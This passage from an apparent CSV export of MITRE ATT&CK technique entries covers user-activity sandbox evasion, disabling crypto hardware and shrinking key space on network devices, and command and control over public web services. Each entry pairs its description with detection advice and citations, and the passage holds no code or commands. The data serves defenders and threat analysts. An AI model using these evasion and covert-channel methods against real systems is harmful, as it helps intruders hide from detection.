Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017) ",https://attack.mitre.org/techniques/T1497/002,06 March 2020,18 October 2021,enterprise-attack,1.1,"Defense Evasion, Discovery","User activity-based checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. ","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation",True,T1497,"Anti-virus, Host forensic analysis, Signature-based detection, Static File Analysis",Deloitte Threat Library Team,,,,,,"(Citation: FireEye FIN7 April 2017),(Citation: Lastline DarkHotel Just In Time Decryption Nov 2015),(Citation: ESET Okrum July 2019),(Citation: Unit42 Molerat Mar 2020),"
T1600.002,attack-pattern--7efba77e-3bc4-4ca5-8292-d8201dcd64b5,Weaken Encryption: Disable Crypto Hardware,"Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.

Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks)",https://attack.mitre.org/techniques/T1600/002,19 October 2020,21 October 2020,enterprise-attack,1.0,Defense Evasion,"There is no documented method for defenders to directly identify behaviors that disable cryptographic hardware. Detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601) and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008). Some detection methods require vendor support to aid in investigation.",Network,File: File Modification,True,T1600,,,Administrator,,,,,","
T1600.001,attack-pattern--3a40f208-a9c1-4efa-a598-4003c3681fb8,Weaken Encryption: Reduce Key Space,"Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.(Citation: Cisco Synful Knock Evolution)

Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.

Adversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601) to change the configuration of the device. (Citation: Cisco Blog Legacy Device Attacks)",https://attack.mitre.org/techniques/T1600/001,19 October 2020,21 October 2020,enterprise-attack,1.0,Defense Evasion,"There is no documented method for defenders to directly identify behaviors that reduce encryption key space. Detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601) and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008). Some detection methods require vendor support to aid in investigation.",Network,File: File Modification,True,T1600,,,Administrator,,,,,","
T1102.002,attack-pattern--be055942-6e63-49d7-9fa1-9cb7d8a8f3f4,Web Service: Bidirectional Communication,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. 

Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. ",https://attack.mitre.org/techniques/T1102/002,14 March 2020,26 March 2020,enterprise-attack,1.0,Command and Control,"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)","Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1102,,,User,,,,,"(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: FireEye Periscope March 2018),(Citation: Unit 42 Kazuar May 2017),(Citation: Trend Micro DRBControl February 2020),(Citation: F-Secure The Dukes),(Citation: Forcepoint Monsoon),(Citation: Mandiant APT1),(Citation: Forcepoint Carbanak Google C2),(Citation: F-Secure CozyDuke),(Citation: Checkpoint IndigoZebra July 2021),(Citation: CyberESI GTALK),(Citation: Talos Group123),(Citation: Talos Kimsuky Nov 2021),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: FireEye APT37 Feb 2018),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Talent-Jump Clambling February 2020),(Citation: Google Election Threats October 2020),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Palo Alto Comnie),(Citation: ESET Grandoreiro April 2020),(Citation: Microsoft POLONIUM June 2022),(Citation: IBM Grandoreiro April 2020),(Citation: Meyers Numbered Panda),(Citation: ESET Telebots June 2017),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: FireEye APT17),(Citation: ESET Crutch December 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: ASERT Donot March 2018),(Citation: Unit 42 Nokki Oct 2018),(Citation: Securelist ScarCruft May 2019),(Citation: CISA ComRAT Oct 2020),(Citation: FireEye admin@338),(Citation: ESET Dukes October 2019),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Github PowerShell Empire),(Citation: ESET Telebots Dec 2016),(Citation: ESET Turla PowerShell May 2019),(Citation: ESET Turla Mosquito May 2018),(Citation: Cofense RevengeRAT Feb 2019),(Citation: ESET ComRAT May 2020),(Citation: BitDefender Chafer May 2020),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: Anomali Static Kitten February 2021),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Mandiant APT1 Appendix),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Lazarus APT January 2022),(Citation: FireEye FIN7 Aug 2018),(Citation: Talos ROKRAT),"
T1102.001,attack-pattern--f7827069-0bf2-4764-af4f-23fae0d181b7,Web Service: Dead Drop Resolver,"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.

Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",https://attack.mitre.org/techniques/T1102/001,14 March 2020,26 March 2020,enterprise-attack,1.0,Command and Control,Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2),"Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1102,,,User,,,,,"(Citation: FireEye Periscope March 2018),(Citation: F-Secure The Dukes),(Citation: Forcepoint Monsoon),(Citation: ESET Casbaneiro Oct 2019),(Citation: FireEye APT41 Aug 2019),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Securelist MiniDuke Feb 2013),(Citation: Unit42 Redaman January 2019),(Citation: Anomali Rocke March 2019),(Citation: Mandiant APT41),(Citation: FireEye APT17),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: ESET Dukes October 2019),(Citation: ESET RTM Feb 2017),(Citation: Palo Alto PlugX June 2017),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Unit42 Xbash Sept 2018),(Citation: Securelist Dropping Elephant),(Citation: TrendMicro Patchwork Dec 2017),(Citation: CheckPoint Redaman October 2019),"
T1102.003,attack-pattern--9c99724c-a483-4d60-ad9d-7f004e42e8e8,Web Service: One-Way Communication,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.

Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",https://attack.mitre.org/techniques/T1102/003,14 March 2020,26 March 2020,enterprise-attack,1.0,Command and Control,Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2),"Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1102,,,User,,,,,"(Citation: FireEye Periscope March 2018),(Citation: FireEye Metamorfo Apr 2018),(Citation: Prevailion EvilNum May 2020),(Citation: F-Secure The Dukes),(Citation: Medium Metamorfo Apr 2020),(Citation: Fortinet Metamorfo Feb 2020),(Citation: FireEye APT29),"
